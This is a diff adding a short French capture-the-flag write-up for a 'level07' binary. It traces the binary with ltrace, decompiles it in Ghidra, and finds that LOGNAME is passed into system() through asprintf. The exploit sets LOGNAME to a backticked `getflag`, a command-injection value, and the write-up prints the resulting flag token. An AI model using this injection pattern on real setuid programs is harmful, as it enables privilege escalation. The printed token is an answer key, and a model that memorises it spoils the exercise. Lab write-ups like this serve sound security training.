@@ -1,0 +1,30 @@
+#ltrace ./level07 
+__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                         = 2007
+geteuid()                                         = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
+getenv("LOGNAME")                                 = "level07"
+asprintf(0xbffff744, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280) = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                            = 0
++++ exited (status 0) +++
+
+#install ghidra > file > new projet
+#file > import file
+#mode table view
+#symbol tree > function > main > decompiler
+pcVar1 = getenv("LOGNAME");
+asprintf(&local_1c,"/bin/echo %s ",pcVar1);
+iVar2 = system(local_1c);
+
+- On voit que le scripte place une commande echo + $LOGNAME dans une chaine, puis il execute cette commande avec system(). LOGNAME contient actuellement notre id.
+
+#export LOGNAME='`getflag`'
+Nous changons simplement cette variable par `getflag` qui sera interprete a l'aide des backtick puis le resultat sera affiche lors de l'execution d'echo. On place des quote pour eviter qu'elle soit interpretee par bash
+
+#./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
